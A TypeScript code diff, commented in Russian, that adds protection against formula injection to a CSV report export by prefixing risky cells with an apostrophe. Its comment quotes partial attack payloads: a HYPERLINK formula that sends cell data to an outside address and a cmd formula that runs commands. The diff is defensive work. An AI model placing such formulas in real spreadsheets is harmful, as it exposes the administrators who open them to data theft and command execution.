@@ -260,6 +260,35 @@ export async function listReportsForUserScope(
   }));
 }
 
+/**
+ * Ячейка CSV: экранирование кавычек плюс защита от подстановки формул.
+ *
+ * Excel и LibreOffice считают формулой любую ячейку, начинающуюся с `=`, `+`,
+ * `-` или `@`, и кавычки от этого не спасают — они всего лишь разделители
+ * полей, интерпретатор их снимает. Комментарий к простою пишет оператор в
+ * свободной форме, а выгрузку открывает администратор: строка вида
+ * `=HYPERLINK("http://…"&A1)` превращается в утечку данных одним кликом,
+ * а `=cmd|…` на старых сборках Excel — в запуск команды (CWE-1236).
+ *
+ * Обезвреживаем апострофом впереди: Excel показывает исходный текст и не
+ * вычисляет его, апостроф в ячейке не виден. Табуляция и перевод строки в
+ * начале тоже считаются началом формулы после того, как парсер их отбросит, —
+ * поэтому смотрим на первый непробельный символ.
+ *
+ * Обычные числа при этом не трогаем. Иначе `-5` уехало бы в файл текстом, и
+ * колонка перестала бы суммироваться — защита сломала бы саму выгрузку. А вот
+ * `-5+A1` числом не является и апостроф получит.
+ */
+const PLAIN_NUMBER = /^-?\d+([.,]\d+)?$/;
+const FORMULA_START = new Set(['=', '+', '-', '@']);
+
+function csvCell(value: string): string {
+  const escaped = value.replace(/"/g, '""');
+  const trimmed = escaped.trimStart();
+  if (PLAIN_NUMBER.test(trimmed)) return `"${escaped}"`;
+  return FORMULA_START.has(trimmed.charAt(0)) ? `"'${escaped}"` : `"${escaped}"`;
+}
+
 export async function exportReportsCsv(filters: {
   tenantId: string;
   siteId?: string | null;
@@ -361,9 +390,7 @@ export async function exportReportsCsv(filters: {
   });
 
   const csvLines = rows.map((row: Record<string, string>) =>
-    Object.values(row)
-      .map((value: string) => `"${value.replace(/"/g, '""')}"`)
-      .join(';')
+    Object.values(row).map(csvCell).join(';')
   );
 
   return BOM + header + '\n' + csvLines.join('\n');
